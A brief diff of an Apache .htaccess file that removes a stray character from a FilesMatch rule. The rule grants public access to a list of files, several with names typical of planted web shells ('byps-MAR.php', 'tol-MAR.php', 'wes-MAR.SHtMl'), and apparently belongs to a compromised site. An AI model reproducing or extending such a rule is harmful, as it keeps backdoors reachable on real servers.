@@ -70,7 +70,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(index.php|Controllers.php|wes-MAR.SHtMl|error.php|config.enc.php|COUNTER_Robots_list.php|NativeXmlSubmissionFileUpload.inc.php|error-MAR.Php|byps-MAR.php|tol-MAR.php|error.php|byps.php|wp-mail.php|submission.php|data.php)$">#
+<FilesMatch "^(index.php|Controllers.php|wes-MAR.SHtMl|error.php|config.enc.php|COUNTER_Robots_list.php|NativeXmlSubmissionFileUpload.inc.php|error-MAR.Php|byps-MAR.php|tol-MAR.php|error.php|byps.php|wp-mail.php|submission.php|data.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
